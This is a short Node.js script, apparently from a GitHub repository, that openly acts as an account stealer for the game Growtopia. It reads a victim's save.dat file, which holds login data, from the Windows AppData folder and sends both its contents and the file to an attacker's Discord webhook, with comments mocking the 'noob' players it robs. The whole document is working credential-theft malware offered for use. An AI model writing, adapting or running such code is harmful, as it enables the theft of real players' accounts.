/*** This code writted in a github account called 'github.com/FrenzY8/ ***/
// idea for make this: galvin0705

console.log("Get ready.. we'll stole a save.data :D")
const os = require('os');
const { 
    Webhook, 
    MessageBuilder 
} = require('discord-webhook-node');
const yourhook = new Webhook('your-faking-noob-webhook');
const fs = require('fs');

// Lets start:D
function stealdat () {
    const path = `C:/Users/User-X/AppData/Local/Growtopia/save.dat`
    if (fs.existsSync(path)) {
    console.log("Lets start this devil-actions.")
    // read it first
    const hasil = fs.readFileSync(path,'utf8')
    const noobembed = new MessageBuilder()
    .setAuthor("New Account h;ve been stolen.", 'https://c.tenor.com/0hjOGLFaQa0AAAAM/lofi-girl-lofi.gif')
    .setURL('https://github.com/FrenzY8')
    .setDescription("```ini\n" + hasil + "\n```")
    .setFooter("Stolen Lol.. Just Imagining noob player get stolen.", 'https://c.tenor.com/0hjOGLFaQa0AAAAM/lofi-girl-lofi.gif')
    //send embed.
    yourhook.send(noobembed)
    //then files.
    yourhook.sendFile(path);
    console.log("Lol... imagine noob get stolen! btw the files h;ve been sended to your webhook.")
  } else {
      console.log("well.. we didnot found any save dat.")
  }
}
// now we do a:
stealdat() // done :)
